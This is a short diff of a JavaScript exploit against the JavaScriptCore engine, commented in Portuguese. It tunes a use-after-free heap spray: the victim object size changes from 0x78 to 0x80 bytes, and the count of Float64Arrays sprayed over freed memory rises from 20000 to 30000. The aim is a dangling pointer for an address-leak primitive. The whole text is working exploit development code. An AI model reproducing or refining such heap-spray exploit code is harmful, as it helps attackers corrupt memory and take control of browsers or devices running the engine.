@@ -243,7 +243,7 @@ async function triggerGC(logFn, pauseFn) {
 // A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     let dangling_ref = null; // Esta será a referência pendurada
-    const VICTIM_SIZE_BYTES = 0x78; // Tamanho do objeto vítima para UAF (128 bytes)
+    const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
 
     // PASSO 1: Criar o objeto vítima que será liberado mas que teremos uma dangling_ref.
     // O tipo de objeto aqui (Float64Array) é crucial para como o ponteiro será lido.
@@ -285,7 +285,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     // PASSO 3: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
     logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 20000; // Aumentado para melhor chance de hit
+    const SPRAY_COUNT_UAF_NEW = 30000; // Aumentado para melhor chance de hit
     const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima
 
     // --- Determinar o ponteiro a ser pulverizado ---
